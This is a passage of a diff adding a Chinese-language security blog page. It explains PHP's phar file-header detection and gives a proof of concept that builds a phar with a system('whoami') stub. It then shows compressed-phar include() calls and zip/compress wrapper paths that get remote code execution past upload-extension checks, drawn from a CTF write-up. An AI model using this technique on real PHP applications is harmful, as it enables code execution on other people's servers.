+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_close</span>(fp);
+</span></span><span style="display:flex;"><span>				fp <span style="color:#f92672">=</span> temp;
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_rewind</span>(fp);
+</span></span><span style="display:flex;"><span>				compression <span style="color:#f92672">=</span> PHAR_FILE_COMPRESSED_BZ2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">/* now, start over */</span>
+</span></span><span style="display:flex;"><span>				test <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!--</span>recursion_count) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to decompress bzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">memcmp</span>(pos, zip_magic, <span style="color:#ae81ff">4</span>)) {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_seek</span>(fp, <span style="color:#ae81ff">0</span>, SEEK_END);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">phar_parse_zipfile</span>(fp, fname, fname_len, alias, alias_len, pphar, error);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (got <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">512</span>) {
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">phar_is_tar</span>(pos, fname)) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">php_stream_rewind</span>(fp);
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">phar_parse_tarfile</span>(fp, fname, fname_len, alias, alias_len, pphar, is_data, compression, error);
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (got <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> (pos <span style="color:#f92672">=</span> <span style="color:#a6e22e">phar_strnstr</span>(buffer, got <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(token), token, <span style="color:#66d9ef">sizeof</span>(token)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) <span style="color:#f92672">!=</span> NULL) {
+</span></span><span style="display:flex;"><span>			halt_offset <span style="color:#f92672">+=</span> (pos <span style="color:#f92672">-</span> buffer); <span style="color:#75715e">/* no -tokenlen+tokenlen here */</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">phar_parse_pharfile</span>(fp, fname, fname_len, alias, alias_len, halt_offset, pphar, compression, error);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		halt_offset <span style="color:#f92672">+=</span> got;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">memmove</span>(buffer, buffer <span style="color:#f92672">+</span> window_size, tokenlen); <span style="color:#75715e">/* move the memory buffer by the size of the window */</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;internal corruption of phar </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> (__HALT_COMPILER(); not found)&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* }}} */</span>
+</span></span></code></pre></div><p>简单来说这个函数负责打开一个可能是 PHAR 的文件流，根据<strong>文件头</strong>来识别它的格式（PHAR、ZIP、TAR、GZ、BZ2），并进行相应的解压和解析，比如文件格式是GZ，就会先进行解压获取其中的phar文件，再进行解析</p>
+<h2 id="利用phar压缩包实现rce">利用phar压缩包实现RCE<a hidden class="anchor" aria-hidden="true" href="#利用phar压缩包实现rce">#</a></h2>
+<p>根据这个特性，可以实现上传不包含php代码的文件实现RCE，一个简单的poc：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#39;exploit.phar&#39;</span>);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$stub <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;&lt;&lt;&#39;</span><span style="color:#e6db74">STUB</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    system(&#39;whoami&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __HALT_COMPILER();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">STUB</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>($stub);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#39;test.txt&#39;</span>, <span style="color:#e6db74">&#39;test&#39;</span>);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>tar和phar都有php明文代码，没必要专门打包一个tar文件，所以选择直接include这个phar文件或压缩文件都可以实现RCE，利用了<code>.phar</code>文件名实现了解压：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;exploit.phar.gz&#34;</span>);   <span style="color:#75715e">// gzip exploit.phar
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;exploit.phar.bz2&#34;</span>);  <span style="color:#75715e">// bzip2 exploit.phar
+</span></span></span></code></pre></div><p>比较奇怪为什么zip没有成功，只能用伪协议，当然gz和bzip2也能用伪协议：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;zip://exploit.phar.zip#exploit.phar&#34;</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;compress.zlib://exploit.phar.gz&#34;</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;compress.bzip2://exploit.phar.bz2&#34;</span>);
+</span></span></code></pre></div><p>之前也提到是根据文件头来识别压缩文件的，所以说即使后缀不为<code>.gz .bz2</code>也是可以实现解压的，可以用于绕过后缀名的检验，只要文件是相应压缩包格式即可</p>
+<p>参考资料：</p>
+<p><a href="https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
